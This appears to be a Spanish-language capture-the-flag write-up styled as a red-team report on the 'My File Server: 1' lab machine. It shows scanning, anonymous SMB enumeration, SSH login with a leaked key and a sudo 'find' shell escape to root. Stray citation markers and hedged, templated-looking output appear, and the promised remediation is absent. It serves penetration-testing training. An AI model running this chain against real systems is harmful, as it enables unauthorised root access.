Red Team Report: Pentesting My File Server 1

Evaluación integral de seguridad sobre un entorno corporativo vulnerable orientado a servicios de almacenamiento, documentando la cadena de explotación técnica y entregando resultados estratégicos a nivel directivo[cite: 22, 23].

1. Contexto del Engagement (Objetivos)

El Escenario

La máquina My File Server: 1 simula un entorno corporativo orientado al intercambio de archivos[cite: 22]. Como analista Red Team, el objetivo es comprometer la máquina aplicando una metodología formal (PTES/OWASP), documentar los hallazgos y proponer medidas de remediación estructuradas[cite: 22].

Criterios Metodológicos

  • Análisis de Servicios: Identificación precisa de vectores en protocolos de transferencia y almacenamiento (FTP, SMB, HTTP).
  • Comunicación Estratégica: Traducción de la explotación técnica a impacto de negocio para el Consejo Directivo[cite: 23, 24].

Attack Path: Metodología Aplicada

Documentación exhaustiva de la cadena de vulneración (Kill Chain) ejecutada sobre My File Server 1, abarcando desde la recolección inicial de información hasta el compromiso total de la infraestructura (Root).

1. Reconocimiento Activo

Ejecución de mapeo de red para descubrir puertos abiertos y enumerar versiones de servicios operativos.

$ nmap -sC -sV -p- -T4 <IP_OBJETIVO>
# Resultados clave:
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.9
80/tcp open http Apache httpd
139/tcp open netbios-ssn Samba smbd
445/tcp open netbios-ssn Samba smbd

2. Fuzzing y Enumeración Web

Exploración del servicio HTTP (Puerto 80) en busca de directorios ocultos o paneles de administración.

$ gobuster dir -u http://<IP> -w common.txt
/readme.txt (Status: 200)
/assets (Status: 301)

3. Evaluación de Protocolos de Archivos (SMB)

Investigación de los puertos 139/445 identificando carpetas compartidas con configuración defectuosa de permisos (Acceso Null Session o Guest).

$ smbclient -L //<IP>/ -N
Sharename Type Comment
--------- ---- -------
smbdata Disk Public Share
IPC$ IPC IPC Service

4. Fuga de Información (Information Disclosure)

Conexión interactiva al recurso expuesto para listar y descargar artefactos sensibles, tales como archivos de texto con nombres de usuarios, contraseñas codificadas o llaves RSA.

smb: \> ls
. D 0
.. D 0
readme.txt N 128
backup_key.txt N 1679
smb: \> get backup_key.txt

5. Explotación (Initial Access)

Tras analizar los archivos exfiltrados, se identifica una contraseña válida o una llave SSH. Se procede a establecer una conexión remota autenticada, logrando acceso de bajo nivel en la máquina.

$ chmod 600 backup_key.txt
$ ssh -i backup_key.txt smbuser@<IP>
smbuser@myfileserver:~$ whoami
smbuser

6. Enumeración Local

Se realiza una inspección interna del sistema operativo. Se revisan configuraciones de sudo, tareas Cron y se buscan binarios con permisos SUID mal configurados.

smbuser@myfileserver:~$ sudo -l
User smbuser may run the following commands:
(root) NOPASSWD: /usr/bin/find

7. Privilege Escalation (Root)

Se detecta que el usuario actual puede ejecutar el binario find como administrador sin requerir contraseña. Basado en GTFOBins, se inyecta un comando de sistema operativo para forzar el despliegue de una shell de altos privilegios.

smbuser@myfileserver:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# cat /root/proof.txt
FLAG{SYSTEM_COMPROMISED}
